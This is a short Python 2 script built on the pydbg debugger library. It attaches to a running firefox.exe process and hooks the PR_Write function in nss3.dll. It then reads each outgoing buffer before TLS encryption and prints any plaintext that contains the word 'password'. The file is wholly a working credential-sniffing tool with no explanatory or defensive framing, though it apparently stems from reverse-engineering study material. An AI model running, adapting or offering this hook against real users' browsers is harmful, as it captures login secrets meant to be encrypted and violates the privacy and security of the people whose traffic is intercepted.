# -*- coding: utf-8 -*-
# @Date    : 2016-08-20 17:02:22
# @Author  : giantbranch (giantbranch@gmail.com)
# @Link    : http://blog.csdn.net/u012763794?viewmode=contents

from pydbg import *
from pydbg.defines import *
import utils
import sys
dbg = pydbg()
found_firefox = False

pattern = "password"

def ssl_sniff(dbg, args):
	buffer = ""
	offset = 0
	while 1:
		byte = dbg.read_process_memory(args[1]+offset, 1)
		if byte != '\x00':
			buffer += byte
			offset += 1
			continue
		else:
			break
	if pattern in buffer:
		print "Pre-Encrypted:%s" % buffer
	return DBG_CONTINUE

for (pid, name) in dbg.enumerate_processes():
	if name.lower() == "firefox.exe":
		found_firefox = True
		hooks = utils.hook_container()
		dbg.attach(pid)
		print "[*] Attaching to firefox.exe with PID:%d" % pid
		hook_address = dbg.func_resolve_debuggee("nss3.dll", "PR_Write")
		if hook_address:
			hooks.add(dbg, hook_address, 2, ssl_sniff, None)
			print "[*] nss3.PR_Write hooked at:0x%08x" % hook_address
			break
		else:
			print "[*] Error:Couldn't resolve hook address."
			sys.exit(-1)

if found_firefox:
	print "[*] Hooks set,continuing process."
	dbg.run()
else:
	print "[*] Error:Couldn't find the firefox.exe process."
	sys.exit(-1)